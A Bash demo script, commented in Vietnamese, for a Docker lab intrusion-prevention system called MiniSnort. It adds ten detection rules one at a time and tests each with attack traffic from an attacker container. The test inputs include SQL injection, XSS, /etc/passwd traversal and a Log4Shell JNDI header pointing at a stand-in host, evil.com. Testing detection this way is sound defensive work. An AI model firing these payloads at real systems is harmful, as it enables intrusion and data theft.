#!/bin/bash
# Script demo đơn giản - Mỗi rule 3 dòng: tạo, test, kết quả

echo "=== MiniSnort IPS Demo ==="
echo ""

docker exec -it ms_attacker bash

# Backup và tạo file trống
sudo cp config/rules/local.rules config/rules/local.rules.bak 2>/dev/null || true
sudo truncate -s 0 config/rules/local.rules
docker exec ms_ips truncate -s 0 /var/log/minisnort/alert.log 2>/dev/null || true

# Rule 1: ICMP Ping Detection
echo "[Rule 1] ICMP Ping Detection"
sudo bash -c 'echo "alert icmp any any -> any any (msg:\"ICMP Ping detected\"; sid:1000001; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker ping -c 2 10.100.0.20 > /dev/null 2>&1 || true
docker exec ms_ips grep -c "ICMP Ping" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 2: ICMP Block (DROP)
echo "[Rule 2] ICMP Block (DROP)"
sudo bash -c 'echo "drop icmp any any -> any any (msg:\"Block all ICMP\"; sid:1000002; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker ping -c 2 10.100.0.20 > /dev/null 2>&1 || true
docker exec ms_ips grep -c "Block all ICMP" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 3: Nmap SYN Scan Detection
echo "[Rule 3] Nmap SYN Scan Detection"
sudo bash -c 'echo "alert tcp any any -> any any (msg:\"Nmap SYN scan detected\"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000003; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker nmap -sS -p 1-100 10.100.0.20 > /dev/null 2>&1 || true
docker exec ms_ips grep -c "Nmap SYN" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 4: SSH Brute Force Detection
echo "[Rule 4] SSH Brute Force Detection"
sudo bash -c 'echo "alert tcp any any -> any 22 (msg:\"SSH brute force attempt\"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000004; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && for i in {1..10}; do docker exec ms_attacker nmap -p 22 10.100.0.20 > /dev/null 2>&1 & done; wait
docker exec ms_ips grep -c "SSH brute force" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 5: SQL Injection Detection
echo "[Rule 5] SQL Injection Detection"
sudo bash -c 'echo "alert tcp any any -> any 80 (msg:\"SQL Injection attempt detected\"; content:\"union\"; nocase; content:\"select\"; nocase; distance:0; sid:1000005; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s "http://10.100.0.20/test?id=1' UNION SELECT 1,2,3--" > /dev/null 2>&1 || true
docker exec ms_ips grep -c "SQL Injection" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 6: Admin Panel Access Detection
echo "[Rule 6] Admin Panel Access Detection"
sudo bash -c 'echo "alert tcp any any -> any 80 (msg:\"Admin panel access attempt\"; content:\"/admin\"; sid:1000006; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s http://10.100.0.20/admin/ > /dev/null 2>&1 || true
docker exec ms_ips grep -c "Admin panel" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 7: XSS Detection
echo "[Rule 7] XSS Detection"
sudo bash -c 'echo "alert tcp any any -> any 80 (msg:\"XSS attack detected\"; content:\"<script\"; nocase; sid:1000007; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s "http://10.100.0.20/search?q=<script>alert(1)</script>" > /dev/null 2>&1 || true
docker exec ms_ips grep -c "XSS attack" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 8: Directory Traversal Detection
echo "[Rule 8] Directory Traversal Detection"
sudo bash -c 'echo "alert tcp any any -> any 80 (msg:\"Directory traversal attempt\"; content:\"../\"; sid:1000008; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s "http://10.100.0.20/file?path=../../../../etc/passwd" > /dev/null 2>&1 || true
docker exec ms_ips grep -c "Directory traversal" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 9: SQLMap Detection
echo "[Rule 9] SQLMap Detection"
sudo bash -c 'echo "alert tcp any any -> any 80 (msg:\"SQLMap automated attack detected\"; content:\"sqlmap\"; nocase; sid:1000009; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s -A "sqlmap/1.0" http://10.100.0.20/ > /dev/null 2>&1 || true
docker exec ms_ips grep -c "SQLMap" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Rule 10: Log4Shell Detection
echo "[Rule 10] Log4Shell Detection"
sudo bash -c 'echo "alert tcp any any -> any any (msg:\"Log4Shell exploit attempt\"; content:\"jndi\"; nocase; sid:1000010; rev:1;)" >> config/rules/local.rules'
docker restart ms_ips && sleep 3 && docker exec ms_attacker curl -s -H "X-Api: \${jndi:ldap://evil.com/a}" http://10.100.0.20/ > /dev/null 2>&1 || true
docker exec ms_ips grep -c "Log4Shell" /var/log/minisnort/alert.log 2>/dev/null | xargs echo "  ✓ Alerts:"
echo ""

# Tổng kết
echo "=== Tổng kết ==="
echo "Tổng alerts: $(docker exec ms_ips wc -l < /var/log/minisnort/alert.log 2>/dev/null || echo 0)"
echo "Xem rules: sudo cat config/rules/local.rules"
echo "Xem log: docker exec ms_ips tail -20 /var/log/minisnort/alert.log"
echo "Dashboard: http://127.0.0.1:8080"
